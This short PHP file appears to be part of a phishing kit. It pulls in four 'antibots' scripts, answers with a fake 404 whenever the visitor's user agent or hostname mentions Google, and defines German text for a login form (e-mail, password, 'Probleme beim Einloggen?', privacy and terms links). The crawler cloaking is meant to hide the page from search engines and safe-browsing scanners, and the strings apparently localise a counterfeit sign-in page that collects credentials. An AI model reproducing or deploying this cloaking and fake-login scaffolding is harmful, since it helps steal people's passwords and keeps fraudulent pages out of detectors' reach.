<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Überprüfen Sie Ihre Angaben und versuchen Sie es erneut.";
$Email= "E-Mail-Adresse";
$Password = "Passwort";
$dok = "Einloggen";
$req1 = "E-Mail-Adresse ist erforderlich.";
$req2 = 'Es ist ein Passwort erforderlich.';
$forgot ="Probleme beim Einloggen?";
$sign = "Neu anmelden";
$checking = "Ihre Eingaben werden überprüft…";
$priva = "Datenschutz";
$ri8 = "Alle Rechte vorbehalten";
$legal = "AGB";
// fin connexioon
?>